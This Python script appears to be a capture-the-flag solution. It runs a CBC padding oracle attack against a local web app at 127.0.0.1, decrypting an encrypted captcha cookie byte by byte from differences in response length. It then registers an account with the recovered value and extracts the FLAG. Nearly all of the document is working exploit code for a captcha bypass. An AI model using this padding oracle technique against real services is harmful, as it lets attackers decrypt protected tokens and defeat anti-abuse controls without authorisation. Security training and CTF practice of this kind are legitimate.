import requests
import base64
import re

URL = "http://127.0.0.1:32869/"

# Fetch session
print("[1] Fetching session...")
r = requests.get(URL)
captcha_b64 = r.cookies['captcha']
session = r.cookies['session']
csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)

captcha = base64.b64decode(captcha_b64)
print(f"Captcha: {captcha.hex()} ({len(captcha)} bytes)")

iv, ct = captcha[:16], captcha[16:]

# Quick padding oracle
s = requests.Session()
def oracle(test_iv):
    full = base64.b64encode(test_iv + ct).decode()
    try:
        resp = s.post(URL, 
            data={'username':'x','captcha':'x','csrf_token':'x','submit':'Register'},
            cookies={'session':session,'captcha':full}, timeout=1.5)
        return len(resp.content)
    except: return -1

print("\n[2] Running padding oracle...")
pt = bytearray(16)
inter = bytearray(16)
base = oracle(iv)

for pad in range(1, 17):
    pos = 16 - pad
    tiv = bytearray(iv)
    for k in range(1, pad):
        tiv[16-k] = inter[16-k] ^ pad
    
    # Try padding values first (likely candidates)
    for g in list(range(1,17)) + list(range(32,127)) + list(range(256)):
        tiv[pos] = g
        if oracle(bytes(tiv)) != base:
            inter[pos] = g ^ pad
            pt[pos] = inter[pos] ^ iv[pos]
            print(f"Byte {pos}: {pt[pos]:02x} '{chr(pt[pos]) if 32<=pt[pos]<127 else '?'}'")
            break

print(f"\nPlaintext: {bytes(pt).hex()}")
print(f"Raw: {bytes(pt)}")

# Remove padding
pv = pt[-1]
if 1 <= pv <= 16:
    sol = bytes(pt[:-pv])
else:
    sol = bytes(pt)

sol_str = sol.decode('utf-8', errors='ignore')
print(f"Solution: '{sol_str}'")

print("\n[3] Registering...")
resp = s.post(URL, 
    data={'username':'hacker123','captcha':sol_str,'csrf_token':csrf,'submit':'Register'},
    cookies={'session':session,'captcha':captcha_b64})

print(f"Status: {resp.status_code}\n")
print(resp.text)

flag = re.search(r'FLAG\{[^}]+\}', resp.text)
if flag:
    print(f"\n*** FLAG: {flag.group(0)} ***")

